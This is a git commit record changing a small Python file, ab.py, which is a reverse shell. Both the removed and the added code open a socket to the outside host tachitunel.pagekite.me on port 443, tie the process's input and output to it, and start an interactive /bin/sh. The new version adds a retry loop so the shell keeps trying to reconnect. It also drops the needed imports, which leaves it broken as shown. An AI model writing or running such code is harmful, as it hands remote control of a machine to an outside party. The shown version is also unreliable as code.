d392a3392a4f4971964c01b8596e4f94227783bb
Juan Mautone <juan.ignaciomautone@gmail.com>
2024-12-15 22:41:37 -0300

    Update ab.py

--- ab.py
+++ ab.py
@@ -1,7 +1,12 @@
-import socket, subprocess, os
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("tachitunel.pagekite.me", 443)) 
-os.dup2(s.fileno(), 0)  
-os.dup2(s.fileno(), 1)  
-os.dup2(s.fileno(), 2)  
-subprocess.call(["/bin/sh", "-i"])  
+import time
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("tachitunel.pagekite.me", 443))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+        break
+    except:
+        time.sleep(5)
